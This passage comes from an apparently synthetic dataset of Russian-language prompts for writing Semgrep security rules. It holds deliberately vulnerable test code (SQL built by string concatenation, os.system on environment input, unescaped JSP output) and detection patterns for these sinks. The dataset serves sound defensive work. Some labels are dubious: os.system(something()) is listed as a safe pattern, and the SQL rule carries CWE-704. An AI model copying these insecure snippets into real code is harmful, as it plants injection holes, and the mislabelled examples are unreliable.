    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-704: Incorrect Type Conversion or Cast\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: tainted-sql-string.py\nimport os\nimport flask\nimport hashlib\nimport requests\nfrom flask_sqlalchemy import SQLAlchemy\n\napp = flask.Flask(__name__)\nengine = SQLAlchemy()\n\n@app.route(\"/insert/person\")\ndef insert_person():\n    name = flask.request.args.get(\"name\")\n    lastname = \"you don't get to pick >:)\"\n\n    # String concatenation using + operator\n    # ruleid: tainted-sql-string\n    engine.execute(\"INSERT INTO person (name) VALUES ('\" + name + \"')\")\n\n    # ruleid: tainted-sql-string\n    engine.execute(\"INSERT INTO person (firstname, lastname) VALUES ('\" + name + \"','\" + lastname + \"')\")\n\n    # ok: tainted-sql-string\n    engine.execute(\"INSERT INTO person (name) VALUES ('\" + lastname +\"')\")\n\n    # Format strings with %\n    # ruleid: tainted-sql-string\n    engine.execute(\"INSERT INTO person (name) VALUES ('%s')\" % (name))\n\n    # ruleid: tainted-sql-string\n    engine.execute(\"INSERT INTO person (name) VALUES ('%s')\" % (flask.request.args.get(\"name\")))\n\n    # ok: tainted-sql-string\n    engine.execute(\"INSERT INTO person (name) VALUES ('%s')\" % (lastname))\n\n    # Format strings with .format\n    # ruleid: tainted-sql-string\n    engine.execute(\"INSERT INTO person (name) VALUES ('{}')\".format(name))\n\n    # Format strings  using fstrings\n    # ruleid: tainted-sql-string\n    engine.execute(f\"SELECT FROM person WHERE name='{name}'\")\n\n    # Query without concatenation\n    # ok: tainted-sql-string\n    engine.execute(\"INSERT INTO person (name) VALUES ('Frodon Sacquet')\")\n\n    # Query using prepared statement with named parameters\n    # ok: tainted-sql-string\n    stmt = text(\"INSERT INTO table (name) VALUES(:name)\")\n    engine.execute(stmt, name=name)\n\n    # SQL Composition and prepared statement\n    # ok: tainted-sql-string\n    query = select(literal_column(\"users.fullname\", String) + ', ' + literal_column(\"addresses.email_address\").label(\"title\")).where(and_(literal_column(\"users.id\") == literal_column(\"addresses.user_id\"), text(\"users.name BETWEEN 'm' AND 'z'\"), text(\"(  # Ограничиваем длину\n\nОпасные паттерны:\n• engine.execute(\"INSERT INTO person (name) VALUES ('\" + name + \"')\")\n• engine.execute(\"INSERT INTO person (firstname, lastname) VALUES ('\" + name + \"','\" + lastname + \"')\")\n• engine.execute(\"%s\" % (name))\n\nБезопасные паттерны:  \n• engine.execute(\"INSERT INTO person (name) VALUES ('\" + lastname + \"')\")\n• engine.execute(\"INSERT INTO person (name) VALUES ('%s')\" % (lastname))\n• stmt = text(\"INSERT INTO table (name) VALUES(:name)\")\n\nЛегенда аннотаций:\n- // ruleid:tainted-sql-string: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-sql-string: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-sql-string\n  message: >-\n    Detected user input used to manually construct a SQL string. This is usually\n    bad practice because manual construction could accidentally result in a SQL\n    injection. An attacker could use a SQL injection to steal or modify contents\n    of the database. Instead, use a parameterized query which is available\n    by default in most database engines. Alternatively, consider using an\n    object-relational mapper (ORM) such as SQLAlchemy which will protect your queries.\n  metadata:\n    cwe:\n    - 'CWE-704: Incorrect Type Conversion or Cast'\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql\n    - https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm\n    - https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column\n    category: security\n    technology:\n    - sqlalchemy\n    - flask\n    subcategory:\n    - vuln\n    impact: MEDIUM\n    likelihood: MEDIUM\n    confidence: MEDIUM\n  severity: ERROR\n  languages:\n  - python\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: flask.request.$ANYTHING\n      - patterns:\n        - pattern-inside: |\n            @$APP.route(...)\n            def $FUNC(..., $ROUTEVAR, ...):\n              ...\n        - pattern: $ROUTEVAR\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: |\n          \"$SQLSTR\" + ...\n      - pattern: |\n          \"$SQLSTR\" % ...\n      - pattern: |\n          \"$SQLSTR\".format(...)\n      - pattern: |\n          f\"$SQLSTR{...}...\"\n    - metavariable-regex:\n        metavariable: $SQLSTR\n        regex: \\s*(?i)(select|delete|insert|create|update|alter|drop)\\b.*\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования незащищенных пользовательских вводных данных при построении SQL-запросов вручную. Источники (sources) определяют, откуда может поступать потенциально небезопасный ввод, например, через аргументы запроса Flask или маршрутизацию URL. Синки (sinks) идентифицируют места, где происходит конкатенация строк или форматирование строк с использованием небезопасных переменных, которые могут привести к SQL-инъекциям. Правило использует комбинацию паттернов для источников и синков, включая регулярные выражения и метапеременные для точного соответствия различным конструкциям Python и Flask.\n\n# Ключевые элементы:\n- ID: tainted-sql-string\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tainted-sql-string",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения use-jstl-escaping\nОписание уязвимости: Detected an Expression Language segment in a tag that does not escape output. This is dangerous because if any data in this expression can be controlled externally, it is a cross-site scripting vulnerability. Instead, use the 'out' tag from the JSTL taglib to escape this expression. See https://www.tutorialspoint.com/jsp/jstl_core_out_tag.htm for more information.\nCWE: CWE-116: Improper Encoding or Escaping of Output\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-116: Improper Encoding or Escaping of Output\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-jstl-escaping.jsp\n<!-- ruleid: use-jstl-escaping -->\n<input value=\"${param.foo}\" />\n<!-- ok: use-jstl-escaping -->\n<c:out value=\"${param.foo}\" />\n\n<div>\n    <!-- this is the reason use-escapexml is the preferred rule. JSP allows dangling EL expressions -->\n    ${param.foo}\n</div>  # Ограничиваем длину\n\nОпасные паттерны:\n• <%= request.getParameter(\"foo\") %>\n• <% out.print(request.getParameter(\"foo\")); %>\n• <c:if test=\"${param.foo}\">...</c:if>\n\nБезопасные паттерны:  \n• <c:out value=\"${param.foo}\" />\n• <fmt:message key=\"${param.messageKey}\" />\n• <a href=\"/${param.url}\">Link</a>\n\nЛегенда аннотаций:\n- // ruleid:use-jstl-escaping: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-jstl-escaping: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-jstl-escaping\n  message: >-\n    Detected an Expression Language segment in a tag that does not escape\n    output. This is dangerous because if any data in this expression\n    can be controlled externally, it is a cross-site scripting\n    vulnerability. Instead, use the 'out' tag from the JSTL taglib\n    to escape this expression.\n    See https://www.tutorialspoint.com/jsp/jstl_core_out_tag.htm\n    for more information.\n  metadata:\n    owasp:\n    - A03:2021 - Injection\n    cwe:\n    - 'CWE-116: Improper Encoding or Escaping of Output'\n    references:\n    - https://www.tutorialspoint.com/jsp/jstl_core_out_tag.htm\n    - https://stackoverflow.com/a/4948856\n    - https://stackoverflow.com/a/3180202\n    category: security\n    technology:\n    - jsp\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  pattern-regex: <(?![A-Za-z0-9]+:out).*?\\$\\{.*?\\}.*>\n  paths:\n    include:\n    - '*.jsp'\n  languages: [regex]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска тегов JSP, содержащих выражения EL (${}) без использования тега 'out' из библиотеки JSTL. Это может привести к XSS-уязвимостям, если входные данные могут контролироваться извне. Правило применимо только к файлам с расширением .jsp.\n\n# Ключевые элементы:\n- ID: use-jstl-escaping\n- Язык: regex \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-jstl-escaping",
      "language": "regex",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения X509-subject-name-validation\nОписание уязвимости: Validating certificates based on subject name is bad practice. Use the X509Certificate2.Verify() method instead.\nCWE: CWE-295: Improper Certificate Validation\nТип анализа: search\nЯзык: csharp",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: search\n- CWE: CWE-295: Improper Certificate Validation\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: X509-subject-name-validation.cs\nusing System.IdentityModel.Tokens;\n\nnamespace System.IdentityModel.Samples\n{\n    public class TrustedIssuerNameRegistry : IssuerNameRegistry\n    {\n        public override string GetIssuerName(SecurityToken securityToken)\n        {\n            X509SecurityToken x509Token = securityToken as X509SecurityToken;\n            if (x509Token != null)\n            {\n                // ruleid: X509-subject-name-validation\n                if (String.Equals(x509Token.Certificate.SubjectName.Name, \"CN=localhost\"))\n                {\n                    return x509Token.Certificate.SubjectName.Name;\n                }\n\n                // ruleid: X509-subject-name-validation\n                if (String.Equals(\"CN=localhost\", x509Token.Certificate.SubjectName.Name))\n                {\n                    return x509Token.Certificate.SubjectName.Name;\n                }\n            }\n\n            // ok\n            if(String.Equals(\"Hello\", \"Goodbye\")) { }\n        }\n\n        public override string GetIssuerName2() // no args\n        {\n            X509SecurityToken x509Token = new X509SecurityToken();\n            if (x509Token != null)\n            {\n                // ruleid: X509-subject-name-validation\n                if (x509Token.Certificate.SubjectName.Name.Equals(\"CN=localhost\"))\n                {\n                    return x509Token.Certificate.SubjectName.Name;\n                }\n            }\n        }\n\n        public override string GetIssuerName3()\n        {\n            X509SecurityToken x509Token = new X509SecurityToken();\n            if (x509Token != null)\n            {\n                // ruleid: X509-subject-name-validation\n                if (\"CN=localhost\" == x509Token.Certificate.SubjectName.Name)\n                {\n                    return x509Token.Certificate.SubjectName.Name;\n                }\n\n                // ruleid: X509-subject-name-validation\n                if (x509Token.Certificate.SubjectName.Name == \"CN=localhost\")\n      # Ограничиваем длину\n\nОпасные паттерны:\n• if (String.Equals(x509Token.Certificate.SubjectName.Name, \"CN=localhost\")) {}\n• if (String.Equals(\"CN=localhost\", x509Token.Certificate.SubjectName.Name)) {}\n• if (x509Token.Certificate.SubjectName.Name.Equals(\"CN=localhost\")) {}\n\nБезопасные паттерны:  \n• if (String.Equals(\"Hello\", \"Goodbye\")) {}\n• if (x509Token.Certificate.SubjectName.Name != \"CN=localhost\") {}\n• if (\"CN=localhost\" != x509Token.Certificate.SubjectName.Name) {}\n\nЛегенда аннотаций:\n- // ruleid:X509-subject-name-validation: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:X509-subject-name-validation: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: X509-subject-name-validation\n  severity: WARNING\n  languages:\n  - csharp\n  metadata:\n    cwe:\n    - 'CWE-295: Improper Certificate Validation'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.issuernameregistry?view=netframework-4.8\n    category: security\n    technology:\n    - .net\n    confidence: MEDIUM\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n  message: >-\n    Validating certificates based on subject name is bad practice. Use the X509Certificate2.Verify()\n    method instead.\n  patterns:\n  - pattern-inside: |\n      using System.IdentityModel.Tokens;\n      ...\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern-inside: |\n            X509SecurityToken $TOK = $RHS;\n            ...\n        - pattern-inside: |\n            $T $M(..., X509SecurityToken $TOK, ...) {\n                ...\n            }\n      - metavariable-pattern:\n          metavariable: $RHS\n          pattern-either:\n          - pattern: $T as X509SecurityToken\n          - pattern: new X509SecurityToken(...)\n    - patterns:\n      - pattern-either:\n        - pattern-inside: |\n            X509Certificate2 $CERT = new X509Certificate2(...);\n            ...\n        - pattern-inside: |\n            $T $M(..., X509Certificate2 $CERT, ...) {\n                ...\n            }\n        - pattern-inside: |\n            foreach (X509Certificate2 $CERT in $COLLECTION) {\n                ...\n            }\n  - patterns:\n    - pattern-either:\n      - pattern: String.Equals($NAME, \"...\")\n      - pattern: String.Equals(\"...\", $NAME)\n      - pattern: $NAME.Equals(\"...\")\n      - pattern: $NAME == \"...\"\n      - pattern: $NAME != \"...\"\n      - pattern: |\n          \"...\" == $NAME\n      - pattern: |\n          \"...\" != $NAME\n    - metavariable-pattern:\n        metavariable: $NAME\n        pattern-either:\n        - pattern: $TOK.Certificate.SubjectName.Name\n        - pattern: $CERT.SubjectName.Name\n        - pattern: $CERT.GetNameInfo(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования проверки имени субъекта сертификата X509 на основе сравнения строковых значений вместо применения метода X509Certificate2.Verify(). Правило использует шаблон внутри файла, содержащий инструкции using для пространства имен System.IdentityModel.Tokens. Затем оно ищет либо присвоение переменной типа X509SecurityToken или нового экземпляра X509SecurityToken, либо присвоение переменной типа X509Certificate2 или коллекции таких объектов. Далее проверяются различные формы сравнений строк, включая методы Equals и оператор равенства, где сравниваются значения SubjectName.Name или аналогичные свойства сертификатов.\n\n# Ключевые элементы:\n- ID: X509-subject-name-validation\n- Язык: csharp \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "X509-subject-name-validation",
      "language": "csharp",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения aws-sqs-queue-unencrypted\nОписание уязвимости: The AWS SQS queue contents are unencrypted. The data could be read if compromised. Enable server-side encryption for your queue using SQS-managed encryption keys (SSE-SQS), or using your own AWS KMS key (SSE-KMS).\nCWE: CWE-311: Missing Encryption of Sensitive Data\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-311: Missing Encryption of Sensitive Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-sqs-queue-unencrypted.tf\n# ruleid: aws-sqs-queue-unencrypted\nresource \"aws_sqs_queue\" \"fail_1\" {\n  name = \"terraform-example-queue\"\n}\n\n# ruleid: aws-sqs-queue-unencrypted\nresource \"aws_sqs_queue\" \"fail_2\" {\n  name                    = \"terraform-example-queue\"\n  sqs_managed_sse_enabled = false\n}\n\n# ok: aws-sqs-queue-unencrypted\nresource \"aws_sqs_queue\" \"pass_1\" {\n  name                    = \"terraform-example-queue\"\n  sqs_managed_sse_enabled = true\n}\n\n# ok: aws-sqs-queue-unencrypted\nresource \"aws_sqs_queue\" \"pass_2\" {\n  name                              = \"terraform-example-queue\"\n  kms_master_key_id                 = \"alias/aws/sqs\"\n  kms_data_key_reuse_period_seconds = 300\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_sqs_queue\" \"fail_1\" { \n  name = \"terraform-example-queue\"\n}\n• resource \"aws_sqs_queue\" \"fail_2\" { \n  name = \"terraform-example-queue\"\n  sqs_managed_sse_enabled = false\n}\n\nБезопасные паттерны:  \n• resource \"aws_sqs_queue\" \"pass_1\" { \n  name = \"terraform-example-queue\"\n  sqs_managed_sse_enabled = true\n}\n• resource \"aws_sqs_queue\" \"pass_2\" { \n  name = \"terraform-example-queue\"\n  kms_master_key_id = \"alias/aws/sqs\"\n  kms_data_key_reuse_period_seconds = 300\n}\n\nЛегенда аннотаций:\n- // ruleid:aws-sqs-queue-unencrypted: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-sqs-queue-unencrypted: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-sqs-queue-unencrypted\n  patterns:\n  - pattern: |\n      resource \"aws_sqs_queue\" $ANYTHING {\n        ...\n      }\n  - pattern-not: |\n      resource \"aws_sqs_queue\" $ANYTHING {\n        ...\n        sqs_managed_sse_enabled = true\n        ...\n      }\n  - pattern-not: |\n      resource \"aws_sqs_queue\" $ANYTHING {\n        ...\n        kms_master_key_id = ...\n        ...\n      }\n  message: >-\n    The AWS SQS queue contents are unencrypted. The data could be read if compromised.\n    Enable server-side encryption for your queue using SQS-managed encryption keys\n    (SSE-SQS), or using your own AWS KMS key (SSE-KMS).\n  languages:\n  - hcl\n  severity: WARNING\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A04:2021 - Insecure Design\n    cwe:\n    - 'CWE-311: Missing Encryption of Sensitive Data'\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse\n    - https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS SQS (очередей сообщений) в Terraform конфигурациях, которые не используют шифрование данных. Оно ищет ресурсы типа 'aws_sqs_queue' и проверяет наличие атрибутов 'sqs_managed_sse_enabled' и 'kms_master_key_id'. Если ни один из этих атрибутов не установлен или их значение равно false или пусто, то считается, что данные в очереди не зашифрованы и генерируется предупреждение.\n\n# Ключевые элементы:\n- ID: aws-sqs-queue-unencrypted\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-sqs-queue-unencrypted",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: dangerous-system-call-tainted-env-args\nОписание уязвимости: Found user-controlled data used in a system call. This could allow a malicious actor to execute commands. Use the 'subprocess' module instead, which is easier to use without accidentally exposing a command injection vulnerability.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-system-call-tainted-env-args.py\nimport os\n\n# ok:dangerous-system-call-tainted-env-args\nos.system(\"ls -al\")\n\n# ok:dangerous-system-call-tainted-env-args\nos.popen(\"cat contents.txt\")\n\nfrom somewhere import something\n\n# fn:dangerous-system-call-tainted-env-args\nos.system(something())\n\n# fn:dangerous-system-call-tainted-env-args\nos.popen(something())\n\n# fn:dangerous-system-call-tainted-env-args\nos.popen2(something())\n\n\n# Environment true positives\ndef env1():\n    envvar1 = os.environ[\"envvar\"]\n\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.system(envvar1)\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.popen(envvar1)\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.popen2(envvar1)\n\n    envvar2 = os.environ.get(\"envvar\")\n\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.system(envvar2)\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.popen(envvar2)\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.popen2(envvar2)\n\n    envvar3 = os.getenv(\"envvar\")\n\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.system(envvar3)\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.popen(envvar3)\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.popen2(envvar3)\n\n\n# Cmd line args\nimport argparse\n\n\ndef args1():\n    parser = argparse.ArgumentParser(description=\"Oops!\")\n    parser.add_argument(\"arg1\", type=str)\n    args = parser.parse_args()\n    arg1 = args.arg1\n\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.system(arg1)\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.popen(arg1)\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.popen2(arg1)\n\n\nimport optparse\n\n\ndef args2():\n    parser = optparse.OptionParser()\n    parser.add_option(\n        \"-f\", \"--file\", dest=\"filename\", help=\"write report to FILE\", metavar=\"FILE\"\n    )\n    (opts, args) = parser.parse_args()\n\n    opt1 = opts.opt1\n    # ruleid:dangerous-system-call-tainted-env-args\n    os.system(opt1)\n    # Ограничиваем длину\n\nОпасные паттерны:\n• os.system(envvar1)\n• os.system(envvar2)\n• os.system(envvar3)\n\nБезопасные паттерны:  \n• os.system('ls -al')\n• os.popen('cat contents.txt')\n• os.system(something())\n\nЛегенда аннотаций:\n- // ruleid:dangerous-system-call-tainted-env-args: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-system-call-tainted-env-args: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-system-call-tainted-env-args\n  mode: taint\n  options:\n    symbolic_propagation: true\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern: os.environ\n          - pattern: os.environ.get('$FOO', ...)\n          - pattern: os.environb\n          - pattern: os.environb.get('$FOO', ...)\n          - pattern: os.getenv('$ANYTHING', ...)\n          - pattern: os.getenvb('$ANYTHING', ...)\n      - patterns:\n        - pattern-either:\n          - patterns:\n            - pattern-either:\n              - pattern: sys.argv\n              - pattern: sys.orig_argv\n          - patterns:\n            - pattern-inside: |\n                $PARSER = argparse.ArgumentParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-inside: |\n                $PARSER = optparse.OptionParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-either:\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.getopt(...)\n                  ...\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.gnu_getopt(...)\n                  ...\n            - pattern-either:\n              - patterns:\n                - pattern-inside: |\n                    for $O, $A in $OPTS:\n                      ...\n                - pattern: $A\n              - pattern: $ARGS\n  pattern-sinks:\n  - patterns:\n    - pattern-not: os.$W(\"...\", ...)\n    - pattern-either:\n      - pattern: os.system(...)\n      - pattern: |\n          $X = __import__(\"os\")\n          ...\n          $X.system(...)\n      - pattern: |\n          $X = __import__(\"os\")\n          ...\n          getattr($X, \"system\")(...)\n      - pattern: |\n          $X = getattr(os, \"system\")\n          ...\n          $X(...)\n      - pattern: |\n          $X = __import__(\"os\")\n          ...\n          $Y = getattr($X, \"system\")\n          ...\n          $Y(...)\n      - pattern: os.popen(...)\n      - pattern: os.popen2(...)\n      - pattern: os.popen3(...)\n      - pattern: os.popen4(...)\n  message: >-\n    Found user-controlled data used in a system call. This could allow a\n    malicious actor to execute commands. Use the 'subprocess' module instead,\n    which is easier to use without accidentally exposing a command injection\n    vulnerability.\n  metadata:\n    source-rule-url: https://bandit.readthedocs.io/en/latest/plugins/b605_start_process_with_a_shell.html\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    asvs:\n      section: 'V5: Validation, Sanitization and Encoding Verification Requirements'\n      control_id: 5.2.4 Dyanmic Code Execution Features\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v52-sanitization-and-sandboxing-requirements\n      version: '4'\n    category: security\n    technology:\n    - python\n    confidence: MEDIUM\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n  languages: [python]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования пользовательского управляемого ввода ($ENV_VAR или $ARG_VAR) в вызове системных вызовов через функции os.system(), os.popen() и их аналоги. Источники (sources) включают переменные окружения и аргументы командной строки. Синки (sinks) охватывают любые вызовы, которые могут быть использованы для выполнения внешних команд. Правило использует паттерны для сопоставления источников и синков, а также учитывает различные способы импорта и вызова функций.\n\n# Ключевые элементы:\n- ID: dangerous-system-call-tainted-env-args\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-system-call-tainted-env-args",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: storage-enforce-https\nОписание уязвимости: Detected a Storage that was not configured to deny action by default. Add `enable_https_traffic_only = true` in your resource block.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: storage-enforce-https.tf\n# pass\nresource \"azurerm_storage_account\" \"good_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = true\n}\n\n# fail\n# ruleid: storage-enforce-https\nresource \"azurerm_storage_account\" \"bad_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = false\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_storage_account\" \"bad_example\" { ... enable_https_traffic_only = false ... }\n• resource \"azurerm_storage_account\" \"another_bad_example\" { ... enable_https_traffic_only = missing ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_storage_account\" \"good_example\" { ... enable_https_traffic_only = true ... }\n\nЛегенда аннотаций:\n- // ruleid:storage-enforce-https: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:storage-enforce-https: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: storage-enforce-https\n  message: >-\n    Detected a Storage that was not configured to deny action by default. Add `enable_https_traffic_only\n    = true`\n    in your resource block.\n  patterns:\n  - pattern-not-inside: |\n      resource \"azurerm_storage_account\" \"...\" {\n      ...\n        enable_https_traffic_only = true\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_storage_account\" \"...\" {\n      ...\n        enable_https_traffic_only = false\n      ...\n      }\n  metadata:\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#enable_https_traffic_only\n    - https://docs.microsoft.com/en-us/azure/storage/common/storage-require-secure-transfer\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Storage Account в Terraform конфигурациях, где параметр 'enable_https_traffic_only' не установлен в значение 'true'. Правило использует конструкцию pattern-not-inside для поиска блоков ресурсов, внутри которых отсутствует требуемый параметр, и pattern-inside для нахождения блоков ресурсов, где параметр явно установлен в неправильное значение. Это позволяет обнаружить потенциальную угрозу передачи чувствительных данных в открытом виде через HTTP.\n\n# Ключевые элементы:\n- ID: storage-enforce-https\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "storage-enforce-https",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: var-in-href\nОписание уязвимости: Detected a template variable used in an anchor tag with the 'href' attribute. This allows a malicious actor to input the 'javascript:' URI and is subject to cross- site scripting (XSS) attacks. If using a relative URL, start with a literal forward slash and concatenate the URL, like this: href='/<%= link =>'. You may also consider setting the Content Security Policy (CSP) header.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: var-in-href.erb\n<!-- cf. https://github.com/caiomartini/mustache-demo/blob/97b9200ebd2d27953febff23e6718aa1aa9ee44d/demo-mustache.html -->\n<!DOCTYPE HTML>\n<html>\n\n\n<div class=\"jumbotron text-center\">\n    <h1 class=\"display-4\">Oi, meu nome é <%= nome %>!</h1>\n    <p class=\"lead\">Isso é apenas uma demonstração de como utilizar o Mustache.JS</p>\n    <!-- ruleid: var-in-href -->\n    <a href=\"<%= link %>\" class=\"text-center\">Click me</a>\n    <!-- ok: var-in-href -->\n    <a href=\"/<%= link %>\" class=\"text-center\">Click me</a>\n\n    <!-- ok: var-in-href -->\n    <a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"> <%= current_user.name.pluralize %> Account <b class=\"caret\"></b></a>\n\n    <!-- ok: var-in-href -->\n    <div class=\"alert lead alert-<%= key %>\"><%= value %> </div>\n\n    <!-- ok: var-in-href -->\n    <a class=\"restore\" 